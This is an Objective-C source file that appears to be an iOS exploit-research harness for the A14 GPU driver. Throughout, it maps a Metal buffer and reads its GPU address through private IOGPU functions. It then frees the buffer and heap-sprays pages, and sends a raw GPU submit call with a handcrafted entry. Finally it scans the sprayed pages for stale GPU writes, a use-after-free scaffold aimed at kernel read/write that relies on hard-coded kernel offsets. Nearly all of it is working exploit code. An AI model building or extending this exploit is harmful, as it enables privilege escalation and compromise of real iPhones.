//
//  B1_B2_LabTest.m
//  P007OpenOnly
//
//  Offsets/VAs: A14_23F77_LabOffsets.h only (ABI 04 + pack 42).
//  Userspace GVA = resource+0x38 / +0x40 (IOGPUResourceGetGPUVirtualAddress*).
//  NEVER use kernel AGX +0x98 / decompiler MemDesc +0x2ab from app code.
//  IOKit: no #import / no link — dlsym only (same as all other probes).
//
#import "B1_B2_LabTest.h"
#import "A14_23F77_LabOffsets.h"
#import "LabLocalTime.h"

#import <Metal/Metal.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <unistd.h>

#define B1B2_BUILD @"b1b2-lab-v6"
#define B1B2_PAGE  A14_23F77_IOGPU_RES_SIZE   /* 0x4000 — type 0x80 size */
#define B1B2_SPRAY 64
#define B1B2_ENTRY_SIZE 0x40u                 /* sel25 fast path (p027) */

typedef uint64_t (*IOGPUGetU64_t)(void *resource);
typedef uint32_t (*IOGPUGetType_t)(void *resource);
typedef mach_port_t (*IOGPUGetConn_t)(void *obj);
typedef uint32_t (*IOGPUGetQid_t)(void *queue);
/* Same signature P027/P010 use — resolve via dlsym("IOConnectCallMethod"), never link IOKit. */
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCnt,
    const void *inputStruct, size_t inputStructCnt,
    uint64_t *output, uint32_t *outputCnt,
    void *outputStruct, size_t *outputStructCnt);

@interface B1_B2_LabTest () {
    id<MTLDevice> _device;
    id<MTLCommandQueue> _queue;
    id<MTLBuffer> _targetBuffer;
    void *_resourceRef;
    uint64_t _gpu_va;            /* userspace +0x38 */
    uint64_t _gpu_va_len;        /* userspace +0x40 */
    uint64_t _gpu_offset;        /* userspace +0x48 */
    uint32_t _res_id;            /* userspace +0x30 */
    uint32_t _res_type;          /* IOGPUResourceGetResourceType */
    mach_port_t _dev_conn;       /* IOGPUDeviceGetConnect */
    mach_port_t _q_conn;         /* IOGPUCommandQueueGetConnect (== device on A14) */
    IOConnectCallMethod_t _iocall; /* dlsym IOKit — never link */
    void *_iogpu_submit_sym;     /* IOGPUCommandQueueSubmitCommandBuffers cite */
    void *_q_ref;                /* IOGPUCommandQueue* for qid/stride */
    uint32_t _qid;
    uint32_t _stride;
    vm_address_t _owned_pages;
    vm_size_t _owned_len;
    void *_spray_pages[B1B2_SPRAY];
    uint32_t _spray_count;
    int _log_fd;
    NSMutableString *_log_buf;
}
@end

@implementation B1_B2_LabTest

+ (instancetype)sharedInstance {
    static B1_B2_LabTest *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[B1_B2_LabTest alloc] init];
    });
    return instance;
}

- (instancetype)init {
    self = [super init];
    if (self) {
        _device = MTLCreateSystemDefaultDevice();
        _queue = [_device newCommandQueue];
        _gpu_va = 0;
        _gpu_va_len = 0;
        _gpu_offset = 0;
        _res_id = 0;
        _res_type = 0;
        _resourceRef = NULL;
        _dev_conn = MACH_PORT_NULL;
        _q_conn = MACH_PORT_NULL;
        _iocall = NULL;
        _iogpu_submit_sym = NULL;
        _q_ref = NULL;
        _qid = 0;
        _stride = B1B2_ENTRY_SIZE;
        _owned_pages = 0;
        _owned_len = 0;
        _spray_count = 0;
        _log_fd = -1;
        memset(_spray_pages, 0, sizeof(_spray_pages));
    }
    return self;
}

#pragma mark - logging

- (void)beginLog:(NSString *)phase {
    if (_log_buf == nil)
        _log_buf = [NSMutableString string];
    [_log_buf setString:@""];

    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"b1b2_lab_log.txt"];
    if (_log_fd >= 0) {
        close(_log_fd);
        _log_fd = -1;
    }
    _log_fd = open(path.UTF8String, O_CREAT | O_WRONLY | O_APPEND, 0644);
    [self lg:@"=== b1b2 %@ session %@ BUILD %@ ===",
          phase, LabLocalMilitaryNow(), B1B2_BUILD];
}

- (void)lg:(NSString *)fmt, ... {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [_log_buf appendString:out];
    if (_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s)
            write(_log_fd, s, strlen(s));
    }
}

- (NSString *)endLog {
    if (_log_fd >= 0) {
        fcntl(_log_fd, F_FULLFSYNC);
        close(_log_fd);
        _log_fd = -1;
    }
    return [_log_buf copy] ?: @"(empty)";
}

- (void)logPinnedLayout {
    [self lg:@"pins us: DEVW+0x%x CONN+0x%x ID+0x%x TYPEB+0x%x GVA+0x%x LEN+0x%x OFF+0x%x",
          A14_23F77_IOGPU_RES_DEVW_OFF, A14_23F77_IOGPU_DEVW_CONN_OFF,
          A14_23F77_IOGPU_RES_ID_OFF, A14_23F77_IOGPU_RES_TYPEBYTE_OFF,
          A14_23F77_IOGPU_US_RES_GVA_OFF, A14_23F77_IOGPU_US_RES_GVALEN_OFF,
          A14_23F77_IOGPU_US_RES_OFFSET_OFF];
    [self lg:@"pins NOT us: kAGX kickVA+0x%x kickSz+0x%x | MemDescFlag+0x%x (not +0x2ab)",
          A14_23F77_AGX_KRES_KICK_VA_OFF, A14_23F77_AGX_KRES_KICK_SZ_OFF,
          A14_23F77_AGX_ARMFW_MEMDESC_FLAG_OFF];
    [self lg:@"pins sels: QueueCreate=%u NewResource=%u SubmitCommandBuffers=%u (scIn=%u scOut=%u)",
          A14_23F77_IOGPU_QUEUE_CREATE_SEL, A14_23F77_IOGPU_NEW_RESOURCE_SEL,
          A14_23F77_IOGPU_SUBMIT_SEL, A14_23F77_IOGPU_SUBMIT_SCIN,
          A14_23F77_IOGPU_SUBMIT_SCOUT];
    [self lg:@"pins B1 host: commitUnmaps=0x%llx unmapThis=0x%llx EnableMemDesc=0x%llx",
          A14_23F77_AGX_UAT_COMMIT_UNMAPS, A14_23F77_AGX_SECUREGART_UNMAP_THIS,
          A14_23F77_AGX_ARMFW_ENABLE_MEMDESC];
    [self lg:@"pins B1 FW TEXT: MapOrReuse=0x%x Attr21b=0x%x record8=0x%x",
          A14_23F77_AGX_FW_MAP_OR_REUSE, A14_23F77_AGX_FW_ATTR21B,
          A14_23F77_AGX_FW_RECORD8_MAP];
}

#pragma mark - helpers

static id unwrapMetal(id obj) {
    if (!obj)
        return nil;
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([obj class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"])
            break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![obj respondsToSelector:sel])
            break;
        id base = ((id (*)(id, SEL))objc_msgSend)(obj, sel);
        if (!base || base == obj)
            break;
        obj = base;
    }
    return obj;
}

static void *metalResourceRef(id obj) {
    obj = unwrapMetal(obj);
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![obj respondsToSelector:sel])
        return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(obj, sel);
}

static void *stripPtr(void *p) {
    return (void *)((uintptr_t)p & 0x0000FFFFFFFFFFFFULL);
}

static void *metalIvar(id obj, const char *name) {
    if (!obj || !name)
        return NULL;
    Class cls = object_getClass(obj);
    while (cls) {
        unsigned int n = 0;
        Ivar *ivs = class_copyIvarList(cls, &n);
        void *val = NULL;
        for (unsigned i = 0; i < n; i++) {
            const char *nm = ivar_getName(ivs[i]);
            if (nm && strcmp(nm, name) == 0) {
                val = *(void **)((char *)(__bridge void *)obj + ivar_getOffset(ivs[i]));
                break;
            }
        }
        free(ivs);
        if (val)
            return val;
        cls = class_getSuperclass(cls);
    }
    return NULL;
}

static int isHeapPtr(void *p) {
    uintptr_t x = (uintptr_t)stripPtr(p);
    return x >= 0x100000000ULL && x < 0x300000000ULL;
}

/* Same C exports P010/P011/P017/P026–P031 use — NOT ObjC getIOGPU*Connection. */
- (void)resolveConnections {
    _dev_conn = MACH_PORT_NULL;
    _q_conn = MACH_PORT_NULL;
    _iocall = NULL;
    _iogpu_submit_sym = NULL;
    _q_ref = NULL;
    _qid = 0;
    _stride = B1B2_ENTRY_SIZE;

    void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!h)
        h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!h) {
        [self lg:@"dlopen IOGPU FAILED: %s", dlerror()];
        return;
    }
    if (!iokit) {
        [self lg:@"dlopen IOKit FAILED: %s", dlerror()];
        return;
    }

    IOGPUGetConn_t devGet = (IOGPUGetConn_t)dlsym(h, "IOGPUDeviceGetConnect");
    IOGPUGetConn_t qGet = (IOGPUGetConn_t)dlsym(h, "IOGPUCommandQueueGetConnect");
    IOGPUGetQid_t qidGet = (IOGPUGetQid_t)dlsym(h, "IOGPUCommandQueueGetID");
    _iogpu_submit_sym = dlsym(h, "IOGPUCommandQueueSubmitCommandBuffers");
    _iocall = (IOConnectCallMethod_t)dlsym(iokit, "IOConnectCallMethod");

    [self lg:@"sym DeviceGetConnect=%p QueueGetConnect=%p QueueGetID=%p",
          devGet, qGet, qidGet];
    [self lg:@"sym SubmitCommandBuffers=%p IOConnectCallMethod=%p",
          _iogpu_submit_sym, _iocall];

    id mtlDev = unwrapMetal(_device);
    id mtlQ = unwrapMetal(_queue);
    void *iodev = stripPtr(metalIvar(mtlDev, "_deviceRef"));
    void *ioq = stripPtr(metalIvar(mtlQ, "_commandQueue"));
    if (!iodev) {
        SEL dsel = NSSelectorFromString(@"deviceRef");
        if ([mtlDev respondsToSelector:dsel])
            iodev = stripPtr(((void *(*)(id, SEL))objc_msgSend)(mtlDev, dsel));
    }
    if (!ioq) {
        SEL qsel = NSSelectorFromString(@"commandQueue");
        if ([mtlQ respondsToSelector:qsel])
            ioq = stripPtr(((void *(*)(id, SEL))objc_msgSend)(mtlQ, qsel));
    }
    _q_ref = ioq;

    if (devGet && iodev && isHeapPtr(iodev)) {
        _dev_conn = (mach_port_t)devGet(iodev);
        [self lg:@"IOGPUDeviceGetConnect(%p) = 0x%x", iodev, _dev_conn];
    }
    if (qGet && ioq && isHeapPtr(ioq)) {
        _q_conn = (mach_port_t)qGet(ioq);
        _qid = qidGet ? qidGet(ioq) : 0;
        [self lg:@"IOGPUCommandQueueGetConnect(%p) = 0x%x qid=%u", ioq, _q_conn, _qid];
    }

    /* stride = *(uint32*)(*(qRef+0x538)+0x268); fast path cap 0x40 (p027) */
    if (ioq && isHeapPtr(ioq)) {
        void *strideObj = stripPtr(*(void **)((uint8_t *)ioq + 0x538));
        if (isHeapPtr(strideObj)) {
            uint32_t qs = *(uint32_t *)((uint8_t *)strideObj + 0x268);
            if (qs > 0 && qs <= B1B2_ENTRY_SIZE)
                _stride = qs;
            [self lg:@"queue stride raw=0x%x use=0x%x (qRef+0x538→+0x268)", qs, _stride];
        } else {
            [self lg:@"qRef+0x538 not heap — stride=0x%x default", _stride];
        }
    }

    if (_dev_conn == MACH_PORT_NULL && _resourceRef) {
        void *devw = stripPtr(*(void * const *)
            ((const uint8_t *)_resourceRef + A14_23F77_IOGPU_RES_DEVW_OFF));
        if (devw) {
            uint32_t conn = 0;
            memcpy(&conn, (const uint8_t *)devw + A14_23F77_IOGPU_DEVW_CONN_OFF, 4);
            _dev_conn = (mach_port_t)conn;
            [self lg:@"fallback DEVW conn=0x%x", conn];
        }
    }
    if (_q_conn == MACH_PORT_NULL && _dev_conn != MACH_PORT_NULL) {
        _q_conn = _dev_conn;
        [self lg:@"queue conn fallback = device conn"];
    }
    [self lg:@"resolve: qid=%u stride=0x%x iocall=%p same_conn=%d",
          _qid, _stride, _iocall, (_dev_conn && _dev_conn == _q_conn) ? 1 : 0];
}

- (BOOL)loadIOGPU:(IOGPUGetU64_t *)outVA
              len:(IOGPUGetU64_t *)outLen
             type:(IOGPUGetType_t *)outType {
    void *h = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!h)
        h = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!h) {
        [self lg:@"dlopen IOGPU FAILED: %s", dlerror()];
        return NO;
    }
    *outVA = (IOGPUGetU64_t)dlsym(h, "IOGPUResourceGetGPUVirtualAddress");
    *outLen = (IOGPUGetU64_t)dlsym(h, "IOGPUResourceGetGPUVirtualAddressLength");
    *outType = (IOGPUGetType_t)dlsym(h, "IOGPUResourceGetResourceType");
    if (!*outVA || !*outLen || !*outType) {
        [self lg:@"dlsym GVA/GVALen/Type FAILED"];
        return NO;
    }
    return YES;
}

- (void)dumpResourceRef:(void *)ref
                    getVA:(IOGPUGetU64_t)getVA
                   getLen:(IOGPUGetU64_t)getLen
                  getType:(IOGPUGetType_t)getType {
    if (!ref) {
        [self lg:@"resourceRef=NULL"];
        return;
    }
    const uint8_t *r = (const uint8_t *)ref;
    uint64_t w10 = 0, w30 = 0, w38 = 0, w40 = 0, w48 = 0;
    memcpy(&w10, r + A14_23F77_IOGPU_RES_DEVW_OFF, 8);
    memcpy(&w30, r + A14_23F77_IOGPU_RES_ID_OFF, 8);
    memcpy(&w38, r + A14_23F77_IOGPU_US_RES_GVA_OFF, 8);
    memcpy(&w40, r + A14_23F77_IOGPU_US_RES_GVALEN_OFF, 8);
    memcpy(&w48, r + A14_23F77_IOGPU_US_RES_OFFSET_OFF, 8);

    uint32_t rid = (uint32_t)w30;
    uint8_t typeb = (uint8_t)(w30 >> 32);
    void *devw = stripPtr(*(void * const *)(r + A14_23F77_IOGPU_RES_DEVW_OFF));
    uint32_t conn = 0;
    if (devw)
        memcpy(&conn, (const uint8_t *)devw + A14_23F77_IOGPU_DEVW_CONN_OFF, 4);

    uint64_t gva = getVA ? getVA(ref) : 0;
    uint64_t glen = getLen ? getLen(ref) : 0;
    uint32_t typ = getType ? getType(ref) : 0;

    _gpu_va = gva;
    _gpu_va_len = glen;
    _gpu_offset = w48;
    _res_id = rid;
    _res_type = typ;
    _resourceRef = ref;

    [self lg:@"resourceRef=%p type=0x%x id=%u typeByte=0x%02x bit7=%d conn=0x%x",
          ref, typ, rid, typeb, (typeb >> 7) & 1, conn];
    [self lg:@"getter GVA=0x%llx GVALen=0x%llx", gva, glen];
    [self lg:@"raw +0x%x=0x%llx +0x%x=0x%llx +0x%x=0x%llx +0x%x=0x%llx +0x%x=0x%llx",
          A14_23F77_IOGPU_RES_DEVW_OFF, w10,
          A14_23F77_IOGPU_RES_ID_OFF, w30,
          A14_23F77_IOGPU_US_RES_GVA_OFF, w38,
          A14_23F77_IOGPU_US_RES_GVALEN_OFF, w40,
          A14_23F77_IOGPU_US_RES_OFFSET_OFF, w48];

    if (w38 != gva || w40 != glen)
        [self lg:@"FAIL offset: raw GVA/LEN != getters (ABI says +0x38/+0x40)"];
    else
        [self lg:@"OK offset: raw +0x38/+0x40 match getters"];

    if (typ != A14_23F77_IOGPU_RES_TYPE_BYTES)
        [self lg:@"WARN type=0x%x wanted 0x%x (SysMemory bytes path)",
              typ, A14_23F77_IOGPU_RES_TYPE_BYTES];
}

- (void)freeOwnedPages {
    if (_owned_pages) {
        vm_deallocate(mach_task_self(), _owned_pages, _owned_len ? _owned_len : B1B2_PAGE);
        _owned_pages = 0;
        _owned_len = 0;
    }
}

- (void)freeSpray {
    for (uint32_t i = 0; i < _spray_count; i++) {
        if (_spray_pages[i]) {
            vm_deallocate(mach_task_self(), (vm_address_t)_spray_pages[i], B1B2_PAGE);
            _spray_pages[i] = NULL;
        }
    }
    _spray_count = 0;
}

#pragma mark - Button 74

- (NSString *)phase1_mapAndLatch {
    [self beginLog:@"phase1"];
    [self logPinnedLayout];
    [self lg:@"Phase1: bytesNoCopy type 0x%x size 0x%x + GVA dump + GetConnect cite.",
          A14_23F77_IOGPU_RES_TYPE_BYTES, B1B2_PAGE];

    if (!_device || !_queue) {
        [self lg:@"FAIL: no Metal device/queue"];
        return [self endLog];
    }

    _targetBuffer = nil;
    _resourceRef = NULL;
    _gpu_va = 0;
    _gpu_va_len = 0;
    _gpu_offset = 0;
    _res_id = 0;
    _res_type = 0;
    [self freeOwnedPages];

    IOGPUGetU64_t getVA = NULL, getLen = NULL;
    IOGPUGetType_t getType = NULL;
    if (![self loadIOGPU:&getVA len:&getLen type:&getType])
        return [self endLog];

    vm_address_t pages = 0;
    if (vm_allocate(mach_task_self(), &pages, B1B2_PAGE, VM_FLAGS_ANYWHERE) == KERN_SUCCESS && pages) {
        memset((void *)pages, 0xAA, B1B2_PAGE);
        id<MTLBuffer> b = [_device newBufferWithBytesNoCopy:(void *)pages
                                                     length:B1B2_PAGE
                                                    options:MTLResourceStorageModeShared
                                                deallocator:^(void *ptr, NSUInteger n) {
                                                    (void)ptr; (void)n;
                                                }];
        void *ref = b ? metalResourceRef(b) : NULL;
        uint32_t t = (ref && getType) ? getType(ref) : 0;
        [self lg:@"bytesNoCopy try buf=%p ref=%p type=0x%x", b, ref, t];
        if (b && ref && t == A14_23F77_IOGPU_RES_TYPE_BYTES) {
            _targetBuffer = b;
            _owned_pages = pages;
            _owned_len = B1B2_PAGE;
        } else {
            if (pages)
                vm_deallocate(mach_task_self(), pages, B1B2_PAGE);
            _targetBuffer = nil;
        }
    }

    if (!_targetBuffer) {
        [self lg:@"fallback newBufferWithLength 0x%x (may not be type 0x80)", B1B2_PAGE];
        _targetBuffer = [_device newBufferWithLength:B1B2_PAGE
                                             options:MTLResourceStorageModeShared];
        if (_targetBuffer && _targetBuffer.contents)
            memset(_targetBuffer.contents, 0xAA, B1B2_PAGE);
    }

    if (!_targetBuffer) {
        [self lg:@"FAIL: no buffer"];
        return [self endLog];
    }

    void *ref = metalResourceRef(_targetBuffer);
    [self dumpResourceRef:ref getVA:getVA getLen:getLen getType:getType];
    [self resolveConnections];

    id<MTLCommandBuffer> cb = [_queue commandBuffer];
    id<MTLBlitCommandEncoder> blit = [cb blitCommandEncoder];
    [blit fillBuffer:_targetBuffer range:NSMakeRange(0, B1B2_PAGE) value:0xBB];
    [blit endEncoding];
    [cb commit];
    [cb waitUntilCompleted];

    if (ref && getVA && getLen)
        [self dumpResourceRef:ref getVA:getVA getLen:getLen getType:getType];

    uint8_t first = 0;
    if (_owned_pages)
        first = ((uint8_t *)_owned_pages)[0];
    else if (_targetBuffer.contents)
        first = ((uint8_t *)_targetBuffer.contents)[0];
    [self lg:@"blit status=%ld first=0x%02x (want 0xBB) owned=0x%llx",
          (long)cb.status, first, (unsigned long long)_owned_pages];
    [self lg:@"Phase1 done. Host UAT mapped. MapOrReuse FW plane is separate (pack 42)."];
    return [self endLog];
}

#pragma mark - Button 75

- (NSString *)phase2_unmapAndReclaim {
    [self beginLog:@"phase2"];
    [self lg:@"Phase2: drop Metal (commitUnmaps cite 0x%llx) + spray 0x%x.",
          A14_23F77_AGX_UAT_COMMIT_UNMAPS, B1B2_PAGE];
    [self lg:@"Stale: GVA=0x%llx GVALen=0x%llx off=0x%llx id=%u type=0x%x",
          _gpu_va, _gpu_va_len, _gpu_offset, _res_id, _res_type];

    if (!_targetBuffer) {
        [self lg:@"FAIL: no target. Run phase1 first."];
        return [self endLog];
    }

    _targetBuffer = nil;
    _resourceRef = NULL;
    [self freeOwnedPages];
    [self freeSpray];

    uint32_t n = 0;
    for (uint32_t i = 0; i < B1B2_SPRAY; i++) {
        vm_address_t addr = 0;
        kern_return_t kr = vm_allocate(mach_task_self(), &addr, B1B2_PAGE, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            [self lg:@"vm_allocate[%u] kr=0x%x — stop", i, kr];
            break;
        }
        memset((void *)addr, 0xCC, B1B2_PAGE);
        _spray_pages[n++] = (void *)addr;
    }
    _spray_count = n;
    [self lg:@"held spray pages=%u size=0x%x marker=0xCC", _spray_count, B1B2_PAGE];
    [self lg:@"Phase2 done."];
    return [self endLog];
}

#pragma mark - Button 76

- (NSString *)phase3_latchedKick {
    [self beginLog:@"phase3"];
    [self lg:@"Phase3 SMOKE: DeviceUC sel=%u Submit (p027 ABI). +0x10=0 only.",
          A14_23F77_IOGPU_SUBMIT_SEL];
    [self lg:@"Do NOT set entry+0x10=ctx here — that queues NQ and DispatchAvailable"];
    [self lg:@"ldr [ctx+0x10]; freeing ctx = hang/UAF (use button 66 p027 for that)."];

    if (!_device || !_queue) {
        [self lg:@"FAIL: no Metal device/queue"];
        return [self endLog];
    }

    [self resolveConnections];
    if (!_iocall) {
        [self lg:@"FAIL: IOConnectCallMethod dlsym NULL"];
        return [self endLog];
    }
    mach_port_t conn = _q_conn != MACH_PORT_NULL ? _q_conn : _dev_conn;
    if (conn == MACH_PORT_NULL) {
        [self lg:@"FAIL: no queue/device connect"];
        return [self endLog];
    }
    if (_qid == 0)
        [self lg:@"WARN: qid=0 — submit may 2c2"];

    /* Fast-path entry 0x40. +0x10 MUST stay 0 for smoke:
       nonzero → kernel builds 0x28 NQ packet → DispatchAvailable blraa FP@ctx+0x10.
       A freed/zero ctx hangs or faults (seen: ldr x11,[x9,#0x10]!). */
    struct __attribute__((packed)) {
        uint64_t reserved0;
        uint64_t reserved1;
        uint64_t ctx_ptr;
        uint64_t vt_ptr;
        uint32_t ns;
        uint8_t  pad[0x1C];
    } entry;
    memset(&entry, 0, sizeof(entry));
    _Static_assert(sizeof(entry) == 0x40, "sel25 fast entry must be 0x40");

    uint64_t in[4] = { _qid, 0, 1, _stride };
    uint64_t out = 0;
    uint32_t nout = 1;

    [self lg:@"submit sel=%u conn=0x%x in=[qid=%u,0,count=1,stride=0x%x] +0x10=0 +0x18=0",
          A14_23F77_IOGPU_SUBMIT_SEL, conn, _qid, _stride];
    kern_return_t kr = _iocall(conn, A14_23F77_IOGPU_SUBMIT_SEL,
                               in, A14_23F77_IOGPU_SUBMIT_SCIN,
                               &entry, sizeof(entry),
                               &out, &nout, NULL, NULL);
    [self lg:@"submit kr=0x%x out=0x%llx", kr, out];

    if (kr == KERN_SUCCESS)
        [self lg:@"=== verdict: sel=%u smoke SUBMIT OK (+0x10=0, no NQ fire) ===",
              A14_23F77_IOGPU_SUBMIT_SEL];
    else if (kr == 0xe00002c2)
        [self lg:@"=== verdict: 2c2 BadArg — qid/stride; do NOT retry with live ctx here ==="];
    else if (kr == 0xe00002be)
        [self lg:@"=== verdict: 2be NoResources ==="];
    else
        [self lg:@"=== verdict: sel=%u smoke kr=0x%x ===", A14_23F77_IOGPU_SUBMIT_SEL, kr];
    return [self endLog];
}

#pragma mark - Button 77

- (NSString *)phase4_verifyReclaim {
    [self beginLog:@"phase4"];
    [self lg:@"Phase4: scan spray for 0xBB over 0xCC (size 0x%x).", B1B2_PAGE];

    if (_spray_count == 0) {
        [self lg:@"FAIL: no spray. Run phase2 first."];
        return [self endLog];
    }

    uint32_t hit = 0;
    for (uint32_t i = 0; i < _spray_count; i++) {
        uint8_t *p = (uint8_t *)_spray_pages[i];
        if (!p)
            continue;
        for (uint32_t j = 0; j < B1B2_PAGE; j++) {
            if (p[j] == 0xBB) {
                [self lg:@"HIT spray[%u] off=0x%x", i, j];
                hit++;
                break;
            }
        }
    }

    if (hit == 0) {
        [self lg:@"no 0xBB (expected without latched kick)."];
        [self lg:@"=== verdict: offsets OK if phase1 matched; leftover unproven. ==="];
    } else {
        [self lg:@"=== verdict: %u hits — investigate; not auto-KRW. ===", hit];
    }

    [self freeSpray];
    return [self endLog];
}

@end
